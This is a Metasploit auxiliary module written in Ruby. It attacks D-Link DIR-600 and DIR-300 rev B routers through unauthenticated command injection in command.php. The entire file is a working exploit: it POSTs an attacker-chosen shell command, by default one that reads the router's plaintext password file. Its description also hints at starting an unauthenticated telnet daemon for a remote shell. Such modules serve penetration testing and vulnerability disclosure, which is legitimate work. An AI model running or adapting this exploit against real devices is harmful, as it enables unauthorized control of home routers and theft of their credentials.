##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'            => 'D-Link DIR-600 rev B / DIR-300 rev B unauthenticated Remote Command Execution in command.php',
			'Description'     => %q{
					Some D-Link Routers are vulnerable to OS Command injection.
				You do not need credentials to the webinterface because the command.php
				is accesseble without authentication. You could read the plaintext password
				file.
				Hint: To get a remote shell you could start the telnetd without any authentication. 
			},
			'Author'          => [ 'm-1-k-3' ],
			'License'         => MSF_LICENSE,
			'References'      =>
				[
					[ 'URL', 'http://www.dlink.de/cs/Satellite?c=Product_C&childpagename=DLinkEurope-DE%2FDLTechProduct&cid=1197381489628&p=1197318958220&packedargs=QuickLinksParentID%3D1197318958220%26locale%3D1195806663795&pagename=DLinkEurope-DE%2FDLWrapper' ],
					[ 'URL', 'http://www.s3cur1ty.de/home-network-horror-days' ],
					[ 'URL', 'http://www.s3cur1ty.de/m1adv2013-003' ],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Feb 04 2013'))

		register_options(
			[
				Opt::RPORT(80),
				OptString.new('CMD', [ true, 'The command to execute', 'cat /var/passwd'])
			], self.class)
	end

	def run
		uri = '/command.php'

		print_status("Sending remote command: " + datastore['CMD'])

		data_cmd = "cmd=#{datastore['CMD']}; echo end"

		begin
			res = send_request_cgi(
				{
					'uri'    => uri,
					'method' => 'POST',
					'data'     => data_cmd,
				})
			return :abort if res.nil?
			return :abort if (res.headers['Server'].nil? or res.headers['Server'] !~ /Linux\,\ HTTP\/1.1,\ DIR/)
			return :abort if (res.code == 404)
		
		rescue ::Rex::ConnectionError
			vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
			return :abort
		end
		
		if res.body.include? "end"
			print_status("Exploited successfully")
			print_line("Command: #{datastore['CMD']}")
			print_line("Output: #{res.body}")
		else
			print_status("Exploit failed.")
		end
	end
end
